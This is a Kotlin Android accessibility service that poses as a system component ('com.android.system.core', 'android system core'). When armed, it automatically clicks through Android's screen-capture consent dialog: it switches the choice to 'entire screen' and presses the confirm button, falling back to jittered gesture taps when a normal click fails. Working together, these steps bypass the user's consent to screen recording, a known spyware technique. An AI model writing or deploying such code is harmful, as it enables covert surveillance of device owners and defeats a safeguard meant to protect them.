package com.android.system.core

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.Locale

class AssistantAutomationService : AccessibilityService() {

    companion object {
        private const val TAG = "AssistantService"
        
        @Volatile
        private var isActive = false
        
        @Volatile
        private var armTimestamp = 0L
        
        @Volatile
        private var step = 1
        
        fun armAutomation() {
            isActive = true
            armTimestamp = System.currentTimeMillis()
            step = 1
            Log.i(TAG, "Automation ARMED. Step 1 started.")
        }

        private fun disarmAutomation() {
            isActive = false
            Log.i(TAG, "Automation DISARMED.")
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Accessibility Service Connected.")
    }

    override fun onInterrupt() { }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!isActive || event == null) return

        if (System.currentTimeMillis() - armTimestamp > 10000L) {
            Log.w(TAG, "Watchdog timeout! Disarming.")
            disarmAutomation()
            return
        }

        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && 
            event.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return
        }

        val allNodes = mutableListOf<AccessibilityNodeInfo>()
        
        try {
            // CRITICAL: Get from event.source FIRST because transient Android 14 popup menus 
            // are sometimes invisible to the standard 'windows' list!
            event.source?.let { collectAllNodes(it, allNodes) }
            
            // Then get from active windows
            windows.forEach { window -> 
                window.root?.let { collectAllNodes(it, allNodes) }
            }

            if (allNodes.isEmpty()) return

            // STRICT DIALOG LOCK (Only enforce in Step 1 to prevent getting locked out during popups)
            if (step == 1) {
                val dialogKeywords = listOf(
                    "share your screen", "system core", "android system core", 
                    "recording or casting", "cast", "start recording?", 
                    "display over", "expose sensitive", "a single app"
                )
                val isDialog = allNodes.any { matchesKeywords(it, dialogKeywords) }
                if (!isDialog) {
                    Log.d(TAG, "Target popup not detected yet. Waiting...")
                    return
                }
            }

            when (step) {
                1 -> {
                    val oneAppKeywords = listOf("share one app", "a single app", "one app", "app window")
                    val oneApp = findBestNode(allNodes, oneAppKeywords)
                    if (oneApp != null) {
                        Log.i(TAG, "STEP 1: Found dropdown. Clicking...")
                        if (executeClick(oneApp)) {
                            step = 2
                            Log.i(TAG, "Moved to STEP 2: Waiting for selection options")
                        }
                    } else {
                        // Check if it ALREADY says entire screen (Android remembered the choice)
                        val alreadySetKeywords = listOf("share entire screen", "entire screen", "entire display")
                        val entireScreen = findBestNode(allNodes, alreadySetKeywords)
                        if (entireScreen != null && !isNodeOrParentClickable(entireScreen)) {
                            Log.i(TAG, "STEP 1: Already set to entire screen (static text). Skipping to STEP 3")
                            step = 3
                        }
                    }
                }
                2 -> {
                    val modeKeywords = listOf("share entire screen", "entire screen", "entire display", "whole screen", "full screen")
                    val entireScreen = findBestNode(allNodes, modeKeywords)
                    if (entireScreen != null) {
                        Log.i(TAG, "STEP 2: Found selection option '$entireScreen'. Clicking...")
                        if (executeClick(entireScreen)) {
                            step = 3
                            Log.i(TAG, "Moved to STEP 3: Waiting for final confirmation")
                        }
                    }
                }
                3 -> {
                    val confirmKeywords = listOf("share screen", "next", "start now", "start", "allow", "accept", "share")
                    val confirm = findBestNode(allNodes, confirmKeywords)
                    if (confirm != null) {
                        Log.i(TAG, "STEP 3: Found confirm button. Clicking...")
                        if (executeClick(confirm)) {
                            Log.i(TAG, "Automation complete! Disarming.")
                            disarmAutomation()
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in automation", e)
        }
    }

    private fun matchesKeywords(node: AccessibilityNodeInfo, keywords: List<String>): Boolean {
        val text = node.text?.toString()?.lowercase(Locale.ROOT)?.trim() ?: ""
        val desc = node.contentDescription?.toString()?.lowercase(Locale.ROOT)?.trim() ?: ""
        val viewId = node.viewIdResourceName?.lowercase(Locale.ROOT) ?: ""
        
        return keywords.any { keyword -> 
            text == keyword || text.contains(keyword) || 
            desc == keyword || desc.contains(keyword) ||
            (keyword.length > 3 && viewId.contains(keyword))
        }
    }

    private fun findBestNode(nodes: List<AccessibilityNodeInfo>, keywords: List<String>): AccessibilityNodeInfo? {
        val matches = nodes.filter { matchesKeywords(it, keywords) }

        if (matches.isEmpty()) return null

        return matches.sortedByDescending { node ->
            var score = 0
            if (node.isClickable) score += 100
            if (isNodeOrParentClickable(node)) score += 50
            if (node.isVisibleToUser) score += 25
            score
        }.firstOrNull()
    }

    private fun isNodeOrParentClickable(node: AccessibilityNodeInfo?): Boolean {
        var current = node
        while (current != null) {
            if (current.isClickable) {
                return true
            }
            current = current.parent
        }
        return false
    }

    private fun executeClick(node: AccessibilityNodeInfo): Boolean {
        var current: AccessibilityNodeInfo? = node
        while (current != null) {
            if (current.isClickable && current.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.i(TAG, "ACTION_CLICK succeeded on ${current.className}")
                return true
            }
            current = current.parent
        }
        
        Log.w(TAG, "ACTION_CLICK failed. Falling back to Physical Gesture Tap!")
        return performPhysicalTap(node)
    }

    private fun performPhysicalTap(node: AccessibilityNodeInfo): Boolean {
        val bounds = android.graphics.Rect()
        node.getBoundsInScreen(bounds)
        if (bounds.isEmpty) return false

        val jitterX = (-2..2).random()
        val jitterY = (-2..2).random()
        val x = bounds.centerX().toFloat() + jitterX
        val y = bounds.centerY().toFloat() + jitterY

        if (x < 0 || y < 0) return false

        val path = android.graphics.Path()
        path.moveTo(x, y)

        val gestureBuilder = android.accessibilityservice.GestureDescription.Builder()
        gestureBuilder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
        
        var gestureDispatched = false
        try {
            gestureDispatched = dispatchGesture(gestureBuilder.build(), object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    Log.i(TAG, "Physical tap completed successfully at X:$x Y:$y")
                }
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to dispatch gesture", e)
        }
        
        // We assume success if the gesture dispatched without throwing an error
        return gestureDispatched
    }

    private fun collectAllNodes(root: AccessibilityNodeInfo?, list: MutableList<AccessibilityNodeInfo>) {
        if (root == null) return
        list.add(root)
        for (i in 0 until root.childCount) {
            collectAllNodes(root.getChild(i), list)
        }
    }
}
